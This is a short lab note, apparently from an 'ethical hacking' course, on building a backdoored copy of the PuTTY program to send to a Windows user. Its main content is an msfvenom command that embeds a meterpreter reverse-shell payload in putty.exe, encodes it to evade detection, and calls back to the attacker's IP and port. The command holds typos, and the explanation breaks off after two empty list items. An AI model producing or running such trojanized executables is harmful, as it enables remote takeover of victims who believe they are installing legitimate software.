# Secu_03
### `Ethical hacking`
we are going to use a trapped file to send to a windows user.
`Lab: backdoor`

* Install putty<hr>
program for remote connections
download here <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a>
<hr>
we will link our putty.exe file to our backdoor.

```terminal
msfvenom -a x86 --plateform windows -x putty.exe -k -p windows/meterpreter/reverse_tpc lhost=your_ip_adresse lport=3232 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o hello.exe
```
I explain to you
* msfvenom a metasploit module that will help us to : 
[1]
[2]